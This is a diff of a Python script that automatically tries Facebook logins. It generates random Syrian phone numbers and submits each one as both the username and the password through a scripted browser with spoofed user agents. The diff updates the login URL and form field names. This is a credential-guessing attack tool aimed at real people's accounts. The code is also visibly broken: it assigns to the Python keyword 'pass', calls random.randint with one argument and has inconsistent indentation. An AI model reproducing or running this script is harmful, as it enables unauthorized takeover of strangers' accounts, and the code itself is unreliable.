@@ -77,7 +77,7 @@ def Lar():
  #email = str(raw_input('email'))
   email = str(random.randint(20111111,20999999))
  #password = str(raw_input('password'))
-  passwd = str(random.randint(1122334455))
+  pass = str(random.randint(1122334455))
 s=str(raw_input('Enter The operator syria  093/094 :'))
 def home():
     for x in range(300):
@@ -88,7 +88,7 @@ def home():
              f = str(ran(941111111,949999999))
             else:
                 exit()
-        login = 'https://facebook.com/login.php?login_attempt=1'
+        login = 'https://www.facebook.com/login.php?login_attempt=1'
         useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 .Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
         def Cr():
@@ -104,7 +104,7 @@ def home():
               site = br.open(login)
               br.select_form(nr=0)
               br.form['email'] = '0' + f
-              br.form['passwd'] = '0' + f
+              br.form['pass'] = '0' + f
               sub = br.submit()
               log = sub.geturl()
               print(A5thar)
